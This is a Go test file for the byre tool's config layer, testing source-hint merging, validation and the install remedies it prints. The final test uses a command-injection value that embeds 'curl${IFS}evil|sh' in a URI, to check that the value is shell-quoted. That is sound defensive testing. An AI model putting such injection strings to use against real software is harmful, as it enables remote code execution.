package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pjlsergeant/byre/internal/packages"
)

func TestSourcesParseMergeAndTemplateRemedy(t *testing.T) {
	home := t.TempDir()
	// default.config hints an id; the project overrides it (last-wins by id).
	def := `[sources]
"pete/box" = { uri = "https://old.example/box/template.config", digest = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }
`
	if err := os.WriteFile(filepath.Join(home, "default.config"), []byte(def), 0o644); err != nil {
		t.Fatal(err)
	}
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0")
	if err != nil {
		t.Fatal(err)
	}
	proj := Config{
		Template: "pete/box",
		Sources: map[string]SourceHint{
			"pete/box": {URI: "https://new.example/box/template.config", Digest: "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
		},
	}
	_, err = resolveWithCatalog(home, proj, cat)
	if err == nil {
		t.Fatal("missing template must error")
	}
	msg := err.Error()
	if !strings.Contains(msg, "byre template install https://new.example/box/template.config --digest sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb") {
		t.Fatalf("remedy must use the winning (project) hint, kind-correct:\n%s", msg)
	}
	if !strings.Contains(msg, "hint from project config") {
		t.Fatalf("remedy must attribute the layer:\n%s", msg)
	}
}

func TestSourcesDefaultLayerRemedy(t *testing.T) {
	home := t.TempDir()
	def := `[sources]
"pete/box" = { uri = "https://old.example/box/template.config" }
`
	if err := os.WriteFile(filepath.Join(home, "default.config"), []byte(def), 0o644); err != nil {
		t.Fatal(err)
	}
	cat, err := packages.LoadCatalog(home, nil, "v0.2.0", "0.2.0")
	if err != nil {
		t.Fatal(err)
	}
	_, err = resolveWithCatalog(home, Config{Template: "pete/box"}, cat)
	if err == nil || !strings.Contains(err.Error(), "hint from default config") {
		t.Fatalf("default-layer hint must attribute itself, got %v", err)
	}
}

func TestSourcesValidation(t *testing.T) {
	if err := (Config{Sources: map[string]SourceHint{"x/y": {URI: " "}}}).ValidateLayer(); err == nil {
		t.Fatal("empty uri must fail validation")
	}
	if err := (Config{Sources: map[string]SourceHint{"x/y": {URI: "https://x", Digest: "8fe3"}}}).ValidateLayer(); err == nil {
		t.Fatal("digest without sha256: prefix must fail validation")
	}
	if err := (Config{Sources: map[string]SourceHint{"x/y": {URI: "https://x", Digest: "sha256:8fe3000000000000000000000000000000000000000000000000000000000000"}}}).ValidateLayer(); err != nil {
		t.Fatal(err)
	}
}

// A hostile hint must buy an install review, not command injection: the
// printed remedy shell-quotes hint-controlled fields (and terminal-escapes
// them, covered by EscapeTerminal's own tests).
func TestSourcesHintIsShellSafe(t *testing.T) {
	h := SourceHint{URI: "https://example/x;curl${IFS}evil|sh", From: "project config"}
	got := h.InstallHint("skill")
	if !strings.Contains(got, `'https://example/x;curl${IFS}evil|sh'`) {
		t.Fatalf("metacharacter URI must be single-quoted:\n%s", got)
	}
	// Plain URIs stay bare for readability.
	plain := SourceHint{URI: "https://example.test/x/skill.toml"}
	if strings.Contains(plain.InstallHint("skill"), "'") {
		t.Fatal("plain URI must not be quoted")
	}
}
